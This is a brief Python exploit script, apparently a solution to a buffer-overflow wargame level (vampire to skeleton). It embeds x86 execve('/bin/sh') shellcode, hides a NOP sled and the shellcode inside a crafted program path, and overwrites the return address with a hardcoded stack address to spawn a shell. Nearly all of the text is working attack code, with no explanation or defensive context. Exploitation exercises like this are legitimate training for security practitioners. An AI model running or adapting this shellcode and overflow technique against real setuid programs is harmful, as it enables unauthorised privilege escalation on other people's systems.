import os
from struct import *

p = lambda x : pack("<L",x)

shellcoe="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
target="/home/vampire/" + "\x90"*200+shellcoe+"/../../../skeleton"
ret = 0xbfffff5c+30
limit = 44



payload = "\x90"*44+p(ret)

os.execv(target,[target,payload])
